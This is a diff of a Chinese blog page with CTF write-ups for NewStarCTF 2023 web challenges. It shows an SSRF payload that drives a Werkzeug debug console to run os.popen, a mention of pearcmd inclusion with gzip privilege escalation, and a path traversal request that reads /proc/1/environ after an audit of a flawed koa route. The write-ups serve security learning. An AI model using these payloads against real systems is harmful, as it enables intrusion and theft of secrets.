+</div><p>传入payload，得到flag。这里需要注意，frm、pin、s等参数不是页面本身的参数，直接传入会被当做页面本身参数解析，所以这几个参数需要用&amp;的url编码连接，空格也需要替换为url编码。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">lolita</span><span class="p">[]</span><span class="o">=</span><span class="nx">Cookie</span><span class="o">:</span><span class="nx">__wzd9f0169d250239adb82c5</span><span class="o">=</span><span class="mi">1748350903</span><span class="o">|</span><span class="nx">f403026852e3</span><span class="o">&amp;</span><span class="nx">url</span><span class="o">=</span><span class="nx">http</span><span class="o">://</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">:</span><span class="mi">1314</span><span class="o">/</span><span class="nx">console</span><span class="o">?%</span><span class="mi">26__</span><span class="nx">debugger__</span><span class="o">=</span><span class="nx">yes</span><span class="o">%</span><span class="mi">26</span><span class="nx">pin</span><span class="o">=</span><span class="mi">186</span><span class="o">-</span><span class="mi">342</span><span class="o">-</span><span class="mi">824</span><span class="o">%</span><span class="mi">26</span><span class="nx">cmd</span><span class="o">=</span><span class="nx">__import__</span><span class="p">(</span><span class="s2">&#34;os&#34;</span><span class="p">)</span><span class="o">.</span><span class="nx">popen</span><span class="p">(</span><span class="s2">&#34;cat%2B/flag&#34;</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()</span><span class="o">%</span><span class="mi">26</span><span class="nx">frm</span><span class="o">=</span><span class="mi">0</span><span class="o">%</span><span class="mi">26</span><span class="nx">s</span><span class="o">=</span><span class="nx">lSWrjtandT1vxutfBNBh</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2023-newstar-web/image-20250527210254553.png"
+	width="1917"
+	height="239"
+	srcset="/p/2023-newstar-web/image-20250527210254553_hu_d6880a846c256a97.png 480w, /p/2023-newstar-web/image-20250527210254553_hu_fb55c252c62fd6b2.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250527210254553"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="802"
+		data-flex-basis="1925px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">解释这个payload：</span>
+</span></span><span class="line"><span class="cl"><span class="o">?</span><span class="nx">lolita</span><span class="p">[]</span><span class="o">=</span><span class="nx">Cookie</span><span class="o">:</span><span class="nx">__wzd9f0169d250239adb82c5</span><span class="o">=</span><span class="mi">1748350903</span><span class="o">|</span><span class="nx">f403026852e3</span>	<span class="c1">#设置 Cookie 头
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">url</span><span class="o">=</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">:</span><span class="mi">1314</span><span class="o">/</span><span class="nx">console</span> <span class="nx">让</span> <span class="nx">cURL</span> <span class="nx">访问本地调试控制台</span>
+</span></span><span class="line"><span class="cl"><span class="nx">__debugger__</span><span class="o">=</span><span class="nx">yes</span><span class="o">:</span> <span class="nx">表示要进入调试模式</span>
+</span></span><span class="line"><span class="cl"><span class="nx">pin</span><span class="o">:</span> <span class="nx">我们计算出的调试密码</span>
+</span></span><span class="line"><span class="cl"><span class="nx">cmd</span><span class="o">:</span> <span class="nx">要执行的命令</span>
+</span></span><span class="line"><span class="cl"><span class="nx">frm</span><span class="o">:</span> <span class="nx">错误来源，如果没有错误信息则为0</span>
+</span></span><span class="line"><span class="cl"><span class="nx">s</span><span class="o">:</span> <span class="nx">会话密钥，用于验证请求的合法性</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>[<a class="link" href="https://blog.csdn.net/fateextra/article/details/147123826"  target="_blank" rel="noopener"
+    >NewStarCTF 2023 公开赛道]pppython?_[newstarctf 2023 公开赛道]babyantsword-CSDN博客</a></p>
+<p><a class="link" href="https://blog.csdn.net/qq_35782055/article/details/129126825"  target="_blank" rel="noopener"
+    >关于ctf中flask算pin总结_ctf:flask-CSDN博客</a></p>
 <h2 id="4-复盘">4-复盘
 </h2><h3 id="考点目录穿越pearcmd文件包含gzip提权">考点：目录穿越pearcmd文件包含+gzip提权
 </h3><p>下载附件有</p>
@@ -4775,8 +5107,274 @@
 <p><a class="link" href="https://gtfobins.github.io/gtfobins/gzip/"  target="_blank" rel="noopener"
     >gzip | GTFOBins</a></p>
 <p>感觉这种类似于要命令执行的文件包含可以多考虑一下pearcmd文件包含</p>
-<h2 id="">
-</h2>
+<h2 id="nextdrive">NextDrive
+</h2><h3 id="md5伪造秒传下载文件伪造cookie目录穿越">md5伪造秒传下载文件+伪造cookie+目录穿越
+</h3><p>先看看秒传的意思</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">网盘秒传的基本原理是利用哈希算法（如MD5或SHA-1）对文件进行特征值提取，然后与服务器上已有的文件特征值进行比对，如果发现相同的特征值，就说明服务器上已经存在相同的文件，无需再上传文件内容，只需建立一个文件链接即可实现秒传。这样可以节省上传时间和网络带宽，提高用户体验。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>大致意思就是MD5值校验因为一样所以秒传，要想不秒传就需要修改使得MD5改变。</strong></p>
+<p>其它没啥用，看test.res.http</p>
+<img src="image-20250527214700883.png" alt="image-20250527214700883" style="zoom:50%;" />
+<p>可以看到大概是每个文件对应文件名，哈希值和文件大小</p>
+<p>上传文件时抓包发现响应头显示无法秒传，响应头有发现jsosn数据只有哈希值和文件名，<code>autoup</code> 选项表示检测过服务器存在相同文件后直接 upload。</p>
+<p><img src="/p/2023-newstar-web/image-20250527220719900.png"
+	width="1671"
+	height="366"
+	srcset="/p/2023-newstar-web/image-20250527220719900_hu_aefe8cdcf7535a77.png 480w, /p/2023-newstar-web/image-20250527220719900_hu_91c08149085f81de.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250527220719900"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="456"
+		data-flex-basis="1095px"
+	
+></p>
+<p>那利用秒传原理要下载test.req.http文件，那么我们应该用文件对应的哈希值去绕过，从而下载下来该文件，打开看看</p>
+<p><img src="/p/2023-newstar-web/image-20250527221347175.png"
+	width="1434"
+	height="606"
+	srcset="/p/2023-newstar-web/image-20250527221347175_hu_c98e39e7e658f0f.png 480w, /p/2023-newstar-web/image-20250527221347175_hu_daec53afa152435c.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250527221347175"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="236"
+		data-flex-basis="567px"
+	
+></p>
+<p>发现cookie，那我们尝试伪造cookie试试，发现登入了admin账户</p>
+<img src="image-20250527221624836.png" alt="image-20250527221624836" style="zoom:50%;" />
+<p>发现share.js有代码，审计看看</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">Router</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;koa-router&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">router</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Router</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">CONFIG</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;../../runtime.config.json&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">Res</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;../../components/utils/response&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">FileSignUtil</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;../../components/utils/file-signature&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span> <span class="nx">DriveUtil</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;../../components/utils/database.utilities&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;fs&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;path&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span> <span class="nx">verifySession</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;../../components/utils/session&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">logger</span> <span class="o">=</span> <span class="nx">global</span><span class="p">.</span><span class="nx">logger</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * @deprecated
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * ! FIXME: 发现漏洞，请进行修改
+</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
+</span></span><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;/s/:hashfn&#34;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">hash_fn</span> <span class="o">=</span> <span class="nb">String</span><span class="p">(</span><span class="nx">ctx</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">hashfn</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//hash 是取 hash_fn 的前64位作为哈希值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kr">const</span> <span class="nx">hash</span> <span class="o">=</span> <span class="nx">hash_fn</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>	
+</span></span><span class="line"><span class="cl">    <span class="c1">// 获取文件所有者ID和自定义文件名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kr">const</span> <span class="nx">from_uid</span> <span class="o">=</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">from_uid</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">custom_fn</span> <span class="o">=</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">fn</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 参数类型校验：确保hash_fn和from_uid都是字符串类型
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">hash_fn</span> <span class="o">!==</span> <span class="s2">&#34;string&#34;</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">from_uid</span> <span class="o">!==</span> <span class="s2">&#34;string&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 参数无效时返回400错误
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">ctx</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s2">&#34;X-Error-Reason&#34;</span><span class="p">,</span> <span class="s2">&#34;Invalid Params&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ctx</span><span class="p">.</span><span class="nx">status</span> <span class="o">=</span> <span class="mi">400</span><span class="p">;</span> <span class="c1">// Bad Request
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 检查文件是否存在于共享系统中
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">IS_FILE_EXIST</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">DriveUtil</span><span class="p">.</span><span class="nx">isShareFileExist</span><span class="p">(</span><span class="nx">hash</span><span class="p">,</span> <span class="nx">from_uid</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">IS_FILE_EXIST</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 文件不存在时返回404错误
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">ctx</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s2">&#34;X-Error-Reason&#34;</span><span class="p">,</span> <span class="s2">&#34;File Not Found&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ctx</span><span class="p">.</span><span class="nx">status</span> <span class="o">=</span> <span class="mi">404</span><span class="p">;</span> <span class="c1">// Not Found
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 检查文件是否实际存在于存储系统中
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">IS_FILE_EXIST_IN_STORAGE</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 使用fs.existsSync检查文件是否存在
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">IS_FILE_EXIST_IN_STORAGE</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">existsSync</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">resolve</span><span class="p">(</span><span class="nx">CONFIG</span><span class="p">.</span><span class="nx">storage_path</span><span class="p">,</span> <span class="nx">hash_fn</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 文件系统操作出错时返回500错误
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">ctx</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s2">&#34;X-Error-Reason&#34;</span><span class="p">,</span> <span class="s2">&#34;Internal Server Error&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ctx</span><span class="p">.</span><span class="nx">status</span> <span class="o">=</span> <span class="mi">500</span><span class="p">;</span> <span class="c1">// Internal Server Error
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">IS_FILE_EXIST_IN_STORAGE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 文件在数据库中存在但在存储中不存在时记录错误并返回500
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">logger</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="sb">`File </span><span class="si">${</span><span class="nx">hash_fn</span><span class="p">.</span><span class="nx">yellow</span><span class="si">}</span><span class="sb"> not found in storage, but exist in database!`</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ctx</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s2">&#34;X-Error-Reason&#34;</span><span class="p">,</span> <span class="s2">&#34;Internal Server Error&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ctx</span><span class="p">.</span><span class="nx">status</span> <span class="o">=</span> <span class="mi">500</span><span class="p">;</span> <span class="c1">// Internal Server Error
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 处理文件名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 如果提供了自定义文件名则使用自定义文件名，否则从数据库获取
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">filename</span> <span class="o">=</span> <span class="k">typeof</span> <span class="nx">custom_fn</span> <span class="o">===</span> <span class="s2">&#34;string&#34;</span> <span class="o">?</span> <span class="nx">custom_fn</span> <span class="o">:</span> <span class="p">(</span><span class="kr">await</span> <span class="nx">DriveUtil</span><span class="p">.</span><span class="nx">getFilename</span><span class="p">(</span><span class="nx">from_uid</span><span class="p">,</span> <span class="nx">hash</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 替换文件名中的非法字符为下划线
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">filename</span> <span class="o">=</span> <span class="nx">filename</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/[\\\/\:\*\&#34;\&#39;\&lt;\&gt;\|\?\x00-\x1F\x7F]/gi</span><span class="p">,</span> <span class="s2">&#34;_&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 设置响应头，指定文件下载时的文件名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">ctx</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s2">&#34;Content-Disposition&#34;</span><span class="p">,</span> <span class="sb">`attachment; filename*=UTF-8&#39;&#39;</span><span class="si">${</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">filename</span><span class="p">)</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 注释掉的代码：使用流式读取文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// ctx.body = fs.createReadStream(path.resolve(CONFIG.storage_path, hash_fn))
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 使用koa-send发送文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kr">await</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">resolve</span><span class="p">(</span><span class="nx">CONFIG</span><span class="p">.</span><span class="nx">storage_path</span><span class="p">,</span> <span class="nx">hash_fn</span><span class="p">)).</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 发送文件出错时记录错误并返回500
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">logger</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="sb">`Error while sending file </span><span class="si">${</span><span class="nx">hash_fn</span><span class="p">.</span><span class="nx">yellow</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">logger</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ctx</span><span class="p">.</span><span class="nx">status</span> <span class="o">=</span> <span class="mi">500</span><span class="p">;</span> <span class="c1">// Internal Server Error
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">router</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">可以看注释有hint存在漏洞。首先是给了处理GET请求的路由，其中路径为./s/加上参数hashfn，检测前64位是否为哈希值，然后从请求中获取参数fn和from_uid，其中from_uid表示下载的文件是这个 uid 的用户分享的；接着就是参数检测，是否为共享文件（参数为哈希值和from_uid），是否存储该文件，然后文件名处理；最后发送时利用path.resolve函数处理，注意里面的参数hash_fn是完全可控的，我们只需要让64位哈希值后面跟上../即可实现路径穿越
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">既然我们知道参数hashfn可控，随便一个在公共资源区的哈希值拼接上/../../../../proc/1/envrion(这里我选的是那个啥十明)，然后由于要验证身份，传参from_uid=100000
+</span></span><span class="line"><span class="cl">（其中的/url编码一下绕过waf）
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">s/5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc%2F..%2F..%2F..%2F..%2Fproc%2F1%2Fenviron?from_uid=100000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2023-newstar-web/image-20250527223058922.png"
+	width="1892"
+	height="1079"
+	srcset="/p/2023-newstar-web/image-20250527223058922_hu_3613516669e3a7d2.png 480w, /p/2023-newstar-web/image-20250527223058922_hu_826a91959548ad80.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250527223058922"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="175"
+		data-flex-basis="420px"
+	
+></p>
+<p>[<a class="link" href="https://blog.csdn.net/m0_73512445/article/details/133694293"  target="_blank" rel="noopener"
+    >NewStarCTF 2023] web题解_ctf web题 发现多个公司员工email-CSDN博客</a></p>
+<p>结语：</p>
+<p><img src="/p/2023-newstar-web/image-20250527224324556.png"
+	width="1813"
+	height="819"
+	srcset="/p/2023-newstar-web/image-20250527224324556_hu_caaee4ccd9891ce.png 480w, /p/2023-newstar-web/image-20250527224324556_hu_aa818ef442858277.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250527224324556"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="221"
+		data-flex-basis="531px"
+	
+></p>
+
 </section>
 
 
